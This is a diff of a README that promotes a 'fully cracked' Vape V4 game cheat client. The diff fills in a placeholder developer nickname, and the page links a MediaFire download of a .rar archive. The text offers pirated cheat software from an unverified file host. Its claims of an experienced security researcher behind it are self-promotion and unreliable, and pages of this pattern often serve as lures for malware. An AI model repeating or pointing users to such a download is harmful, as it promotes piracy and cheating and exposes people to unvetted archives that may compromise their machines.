@@ -19,7 +19,7 @@ This project is for educational purposes only. Using cheats on servers may resul
 🔹 [[Download Here](https://www.mediafire.com/file/cir7ldeviwn6eec/Vape+V4.rar/file)](#) 
 
 ## 🧑‍💻 About the Developer  
-I am [YourNickname], an experienced developer with over 8 years in software development, reverse engineering, and security research. My goal is to provide high-quality tools and make premium software accessible to everyone.  
+I am [BCB], an experienced developer with over 8 years in software development, reverse engineering, and security research. My goal is to provide high-quality tools and make premium software accessible to everyone.  
 
 This project is a fully cracked version of Vape V4, allowing you to enjoy all premium features for free, without account binding or restrictions.  
 
